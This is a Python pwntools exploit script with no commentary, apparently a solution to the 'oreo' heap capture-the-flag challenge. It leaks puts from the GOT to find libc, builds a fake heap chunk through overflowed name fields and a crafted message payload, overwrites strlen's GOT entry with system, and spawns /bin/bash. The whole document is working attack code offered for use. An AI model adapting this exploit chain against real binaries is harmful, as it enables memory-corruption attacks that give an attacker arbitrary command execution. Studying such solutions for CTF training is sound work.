from pwn import *
from LibcSearcher import LibcSearcher
#context.log_level='debug'
sh=process('./oreo')
elf=ELF('./oreo')
#gdb.attach(sh)

def add(name,des):
    sh.sendline('1')
    sh.sendline(name)
    #sleep(0.5)
    sh.sendline(des)

def show():
    sh.sendline('2')
    sh.recvuntil('===================================\n')

def order():
    sh.sendline('3')

def message(words):
    sh.sendline('4')
    sh.sendline(words)

puts_got=p32(elf.got['puts'])
add('a'*27+puts_got,'123')
show()
sh.recvlines(4)
sh.recvuntil('Description: ')
puts_addr=u32(sh.recv(4))
sh.recv()
log.success('puts addr:'+hex(puts_addr))
libc=LibcSearcher('puts',140)
libc_base=puts_addr-libc.dump('puts')
log.success('libc:'+hex(libc_base))
for i in range(0x3f):
    add('a'*27+p32(0),'321')
add('a'*27+p32(0x0804a2a8),'123')
payload = 0x20 * '\x00' + p32(0x40) + p32(0x100)
payload = payload.ljust(52, 'b')
payload += p32(0)
payload = payload.ljust(128, 'c')
message(payload)
order()
strlen=elf.got['strlen']
add('123',p32(strlen))
system_addr=libc_base+libc.dump('system')
log.success('system addr:'+hex(system_addr))
payload2=p32(system_addr)+';/bin/bash\x00'
message(payload2)
sh.interactive()
